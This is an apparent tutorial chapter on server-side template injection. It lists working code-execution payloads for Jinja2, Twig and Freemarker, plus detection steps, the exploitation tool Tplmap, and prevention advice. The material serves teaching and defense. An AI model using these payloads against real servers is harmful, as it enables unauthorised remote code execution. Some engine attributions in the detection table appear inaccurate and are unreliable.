# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into server-side templates and executed.

## Template Engine Detection
| Payload | Possible Engine |
|---------|----------------|
| ${7*7} | Freemarker, Jinja2 |
| {{7*7}} | Jinja2, Twig, Nunjucks |
| #{7*7} | Ruby (ERB) |
| <%= 7*7 %> | ERB |
| ${{7*7}} | Smarty |

## Payloads by Engine

### Jinja2 (Python/Flask)
```python
{{ 7*7 }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig (PHP/Symfony)
```php
{{ 7*7 }}
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

### Freemarker (Java)
```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Detection
1. Identify template reflection - input appears in output
2. Test basic math: {{7*7}} -> 49 confirms SSTI
3. Read framework info: {{config}}, {{_self}}
4. Escalate to RCE with engine-specific payloads

## Tools
- Tplmap - automated SSTI exploitation
- Dalfox --ssti flag
- Nuclei SSTI templates

## Prevention
- Never embed user input in templates
- Use sandboxed template engines
- Auto-escape template output
- Limit available functions in template context

---

> **Next**: [XML External Entities (XXE)](12-xxe.md)
